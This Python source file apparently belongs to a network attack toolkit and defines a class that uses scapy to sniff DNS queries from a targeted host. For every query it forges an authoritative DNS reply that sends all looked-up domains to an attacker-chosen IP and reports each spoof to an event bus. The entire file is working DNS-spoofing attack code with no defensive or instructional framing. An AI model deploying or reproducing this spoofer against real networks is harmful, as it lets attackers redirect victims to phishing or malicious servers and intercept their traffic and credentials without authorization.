import threading
from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send


class DnsSpoofer:
    def __init__(self, bus):
        self.bus = bus
        self._thread = None
        self._stop = threading.Event()
        self.active = False
        self.iface = None
        self.target_ip = None
        self.redirect_ip = None

    def start(self, iface: str, target_ip: str, redirect_ip: str):
        if self._thread and self._thread.is_alive():
            return
        self.iface = iface
        self.target_ip = target_ip
        self.redirect_ip = redirect_ip
        self.active = True
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        self.active = False

    def _run(self):
        sniff(
            iface=self.iface,
            filter=f"udp port 53 and src host {self.target_ip}",
            prn=self._handle,
            store=False,
            stop_filter=lambda _: self._stop.is_set(),
        )

    def _handle(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
            return
        qname = pkt[DNSQR].qname
        domain = qname.decode(errors="replace").rstrip(".")
        resp = (
            IP(src=pkt[IP].dst, dst=pkt[IP].src)
            / UDP(sport=53, dport=pkt[UDP].sport)
            / DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=qname, ttl=10, rdata=self.redirect_ip),
            )
        )
        send(resp, iface=self.iface, verbose=False)
        self.bus.on_dns_spoof(domain, self.redirect_ip)
